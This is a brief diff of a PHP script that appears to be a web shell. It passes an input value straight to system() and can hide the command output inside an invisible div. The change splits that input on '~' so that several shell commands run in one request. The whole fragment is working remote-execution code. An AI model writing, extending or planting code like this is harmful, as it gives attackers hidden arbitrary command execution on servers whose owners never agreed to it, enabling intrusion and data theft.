@@ -9,7 +9,13 @@ if($cont) {
 	if($disp != 0) echo '<b>Command : </b><i>'.$cont.'</i> <br><br>';
 
 	if($disp == 0) echo '<div style="display:none;">';
-	system($cont);
+
+	$cont = explode('~',$cont);
+	print_r($cont);
+	foreach($cont as $cmd) {
+		system($cmd);
+	}
+
 	if($disp == 0) echo '</div>';
 
 	if($disp != 0) echo '</pre>';
